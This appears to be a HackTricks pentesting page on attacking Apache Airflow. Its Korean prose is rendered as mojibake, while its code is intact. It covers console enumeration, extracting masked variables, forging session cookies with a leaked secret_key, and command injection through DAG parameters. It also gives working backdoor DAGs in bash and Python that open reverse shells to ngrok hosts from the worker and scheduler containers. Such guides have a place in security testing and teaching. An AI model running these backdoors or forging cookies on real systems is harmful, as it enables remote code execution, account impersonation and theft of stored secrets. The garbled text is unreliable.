# Apache Airflow ë³´ì•ˆ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

[**Apache Airflow**](https://airflow.apache.org)ëŠ” **ë°ì´í„° íŒŒì´í”„ë¼ì¸ ë˜ëŠ” ì›Œí¬í”Œë¡œìš°ë¥¼ ì¡°ì •í•˜ê³  ì˜ˆì•½**í•˜ê¸° ìœ„í•œ í”Œë«í¼ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. ë°ì´í„° íŒŒì´í”„ë¼ì¸ì˜ "ì¡°ì •"ì´ë€ ë‹¤ì–‘í•œ ì†ŒìŠ¤ì—ì„œ ë°œìƒí•˜ëŠ” ë³µì¡í•œ ë°ì´í„° ì›Œí¬í”Œë¡œìš°ë¥¼ ì •ë¦¬, ì¡°ì • ë° ê´€ë¦¬í•˜ëŠ” ê³¼ì •ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¡°ì •ëœ ë°ì´í„° íŒŒì´í”„ë¼ì¸ì˜ ì£¼ìš” ëª©ì ì€ ì²˜ë¦¬ëœ ë°ì´í„° ì„¸íŠ¸ë¥¼ ì œê³µí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ë°ì´í„° ì„¸íŠ¸ëŠ” ë¹„ì¦ˆë‹ˆìŠ¤ ì¸í…”ë¦¬ì „ìŠ¤ ë„êµ¬, ë°ì´í„° ê³¼í•™ ë° ë¨¸ì‹  ëŸ¬ë‹ ëª¨ë¸ì„ í¬í•¨í•œ ë‹¤ì–‘í•œ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ ê´‘ë²”ìœ„í•˜ê²Œ í™œìš©ë˜ë©°, ì´ëŠ” ëŒ€ê·œëª¨ ë°ì´í„° ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ê¸°ëŠ¥ì— ê¸°ì´ˆí•©ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ, Apache Airflowë¥¼ ì‚¬ìš©í•˜ë©´ **ë¬´ì–¸ê°€** (ì´ë²¤íŠ¸, cron) **ë°œìƒ ì‹œ ì½”ë“œ ì‹¤í–‰ì„ ì˜ˆì•½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë¡œì»¬ ë©

### Docker-Compose

[**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml)ì˜ **docker-compose êµ¬ì„± íŒŒì¼**ì„ ì‚¬ìš©í•˜ì—¬ ì™„ì „í•œ Apache Airflow ë„ì»¤ í™˜ê²½ì„ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (MacOSì—ì„œëŠ” ë„ì»¤ VMì— ì ì–´ë„ 6GBì˜ RAMì„ í• ë‹¹í•´ì•¼ í•©ë‹ˆë‹¤).

### Minikube

Apache Airflowë¥¼ ì‹¤í–‰í•˜ëŠ” **ê°„ë‹¨í•œ ë°©ë²•** ì¤‘ í•˜ë‚˜ëŠ” **minikube**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹¤í–‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow êµ¬ì„±

AirflowëŠ” êµ¬ì„±ì— **ë¯¼ê°í•œ ì •ë³´**ë¥¼ ì €ì¥í•  ìˆ˜ ìˆìœ¼ë©°, ì•½í•œ êµ¬ì„±ì„ ì°¾ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Airflowë¥¼ ê³µê²©í•˜ê¸° ì „ì— **ê¶Œí•œì´ ì‘ë™í•˜ëŠ” ë°©ì‹**ì„ ì´í•´í•´ì•¼ í•©ë‹ˆë‹¤:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## ê³µê²©

### ì›¹ ì½˜ì†” ì—´ê±°

ì›¹ ì½˜ì†”ì— **ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´**, ë‹¤ìŒ ì •ë³´ ì¤‘ ì¼ë¶€ ë˜ëŠ” ëª¨ë‘ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ë³€ìˆ˜** (ì—¬ê¸°ì— ì‚¬ìš©ì ì •ì˜ ë¯¼ê°í•œ ì •ë³´ê°€ ì €ì¥ë  ìˆ˜ ìˆìŒ)
* **ì—°ê²°** (ì—¬ê¸°ì— ì‚¬ìš©ì ì •ì˜ ë¯¼ê°í•œ ì •ë³´ê°€ ì €ì¥ë  ìˆ˜ ìˆìŒ)
* `http://<airflow>/connection/list/`ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥
* [**êµ¬ì„±**](./#airflow-configuration) (ë¹„ë°€ í‚¤ ë° ë¹„ë°€ë²ˆí˜¸ì™€ ê°™ì€ ë¯¼ê°í•œ ì •ë³´ê°€ ì €ì¥ë  ìˆ˜ ìˆìŒ)
* ì‚¬ìš©ì ë° ì—­í•  ëª©ë¡
* ê° DAGì˜ **ì½”ë“œ** (í¥ë¯¸ë¡œìš´ ì •ë³´ê°€ í¬í•¨ë  ìˆ˜ ìˆìŒ)

### ë³€ìˆ˜ ê°’ ê²€ìƒ‰

Airflowì—ì„œëŠ” DAGê°€ ê°’ì„ **ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆë„ë¡ ë³€ìˆ˜ë¥¼ ì €ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë¥¸ í”Œë«í¼ì˜ ë¹„ë°€ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤. **ì¶©ë¶„í•œ ê¶Œí•œ**ì´ ìˆë‹¤ë©´ GUIì—ì„œ `http://<airflow>/variable/list/`ì—ì„œ ë³€ìˆ˜ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê¸°ë³¸ì ìœ¼ë¡œ AirflowëŠ” GUIì—ì„œ ë³€ìˆ˜ì˜ ê°’ì„ í‘œì‹œí•˜ì§€ë§Œ, [**ì´ ê¸€**](https://marclamberti.com/blog/variables-with-apache-airflow/)ì— ë”°ë¥´ë©´ GUIì—ì„œ **ë³„í‘œ**ë¡œ í‘œì‹œë  **ê°’**ì˜ **ë³€ìˆ˜ ëª©ë¡**ì„ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (79).png>)

ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ **ê°’**ì€ ì—¬ì „íˆ **CLI**(DB ì•¡ì„¸ìŠ¤ í•„ìš”), **ì„ì˜ì˜ DAG** ì‹¤í–‰, ë³€ìˆ˜ ì—”ë“œí¬ì¸íŠ¸ì— **API**(APIë¥¼ í™œì„±í™”í•´ì•¼ í•¨)ë¡œ **ê²€ìƒ‰**í•  ìˆ˜ ìˆìœ¼ë©°, ì‹¬ì§€ì–´ **GUI ìì²´ì—ì„œë„!**\
GUIì—ì„œ ì´ëŸ¬í•œ ê°’ì„ ì•¡ì„¸ìŠ¤í•˜ë ¤ë©´ ì•¡ì„¸ìŠ¤í•˜ë ¤ëŠ” **ë³€ìˆ˜ë¥¼ ì„ íƒ**í•˜ê³  **ì‘ì—… -> ë‚´ë³´ë‚´ê¸°**ë¥¼ í´ë¦­í•˜ë©´ ë©ë‹ˆë‹¤.\
ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ **ê²€ìƒ‰ í•„í„°ë§**ì„ ì‚¬ìš©í•˜ì—¬ **ìˆ¨ê²¨ì§„ ê°’**ì„ **ë¬´ì°¨ë³„ ëŒ€ì…**í•˜ì—¬ ì°¾ëŠ” ê²ƒì…ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (30).png>)

### ê¶Œí•œ ìƒìŠ¹

**`expose_config`** êµ¬ì„±ì´ **True**ë¡œ ì„¤ì •ëœ ê²½ìš°, **ì‚¬ìš©ì ì—­í• ** ë° **ê·¸ ì´ìƒ**ì—ì„œëŠ” **ì›¹ì—ì„œ êµ¬ì„±ì„ ì½ì„ ìˆ˜** ìˆìŠµë‹ˆë‹¤. ì´ êµ¬ì„±ì—ëŠ” **`secret_key`**ê°€ í‘œì‹œë˜ë¯€ë¡œ ì´ ìœ íš¨í•œ í‚¤ë¥¼ ê°€ì§„ ì‚¬ìš©ìëŠ” **ìì‹ ì˜ ì„œëª…ëœ ì¿ í‚¤ë¥¼ ìƒì„±í•˜ì—¬ ë‹¤ë¥¸ ì‚¬ìš©ì ê³„ì •ì„ ê°€ì¥**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG ë°±ë„ì–´ (Airflow ì›Œì»¤ì—ì„œì˜ RCE)

ë§Œì•½ **DAGê°€ ì €ì¥ë˜ëŠ” ê³³ì— ì“°ê¸° ê¶Œí•œ**ì´ ìˆë‹¤ë©´, **í•˜ë‚˜ë¥¼ ìƒì„±**í•˜ì—¬ **ë¦¬ë²„ìŠ¤ ì‰˜ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
ì´ ë¦¬ë²„ìŠ¤ ì‰˜ì€ **airflow ì›Œì»¤ ì»¨í…Œì´ë„ˆ** ë‚´ì—ì„œ ì‹¤í–‰ë  ê²ƒì…ë‹ˆë‹¤:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG ë°±ë„ì–´ (Airflow ìŠ¤ì¼€ì¤„ëŸ¬ì—ì„œì˜ RCE)

ë§Œì•½ **ì½”ë“œì˜ ë£¨íŠ¸ì—ì„œ ì‹¤í–‰ë˜ë„ë¡ ì„¤ì •**í•œë‹¤ë©´, í˜„ì¬ ì‘ì„± ì‹œì ì—ì„œëŠ” DAG í´ë”ì— ë„£ì€ í›„ ëª‡ ì´ˆ í›„ì— **ìŠ¤ì¼€ì¤„ëŸ¬ì— ì˜í•´ ì‹¤í–‰**ë  ê²ƒì…ë‹ˆë‹¤.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG ìƒì„±

DAG í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ì˜ ê¸°ê¸°ë¥¼ **ì¹¨í•´**í•˜ë©´ `dags/` í´ë”ì— ìƒˆë¡œìš´ **DAG ìŠ¤í¬ë¦½íŠ¸**ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” DAG í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ë‹¤ë¥¸ ê¸°ê¸°ì—ë„ **ë³µì œ**ë©ë‹ˆë‹¤.

### DAG ì½”ë“œ ì‚½ì…

GUIì—ì„œ DAGë¥¼ ì‹¤í–‰í•  ë•Œ **ì¸ìˆ˜ë¥¼ ì „ë‹¬**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ, DAGê°€ ì˜¬ë°”ë¥´ê²Œ ì‘ì„±ë˜ì§€ ì•Šì€ ê²½ìš° **Command Injectionì— ì·¨ì•½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì´ ì´ CVEì—ì„œ ë°œìƒí•œ ì‚¬ë¡€ì…ë‹ˆë‹¤: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

DAGì—ì„œ **Command Injectionì„ ì°¾ê¸° ì‹œì‘**í•˜ê¸° ìœ„í•´ ì•Œì•„ì•¼ í•  ê²ƒì€ **ë§¤ê°œë³€ìˆ˜**ê°€ **ë‹¤ìŒ ì½”ë“œë¡œ ì•¡ì„¸ìŠ¤**ëœë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤: **`dag_run.conf.get("param_name")`**.

ë˜í•œ, **ë³€ìˆ˜**ì—ì„œë„ ë™ì¼í•œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì¶©ë¶„í•œ ê¶Œí•œì´ ìˆë‹¤ë©´ GUIì—ì„œ ë³€ìˆ˜ì˜ ê°’ì„ **ì œì–´**í•  ìˆ˜ ìˆìŒì— ìœ ì˜í•˜ì„¸ìš”). ë³€ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ **ì•¡ì„¸ìŠ¤**ë©ë‹ˆë‹¤:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
ì˜ˆë¥¼ ë“¤ì–´, ê·¸ë“¤ì´ bash ëª…ë ¹ì–´ ì•ˆì—ì„œ ì‚¬ìš©ëœë‹¤ë©´, ëª…ë ¹ì–´ ì¸ì ì…˜ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•ë“¤:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
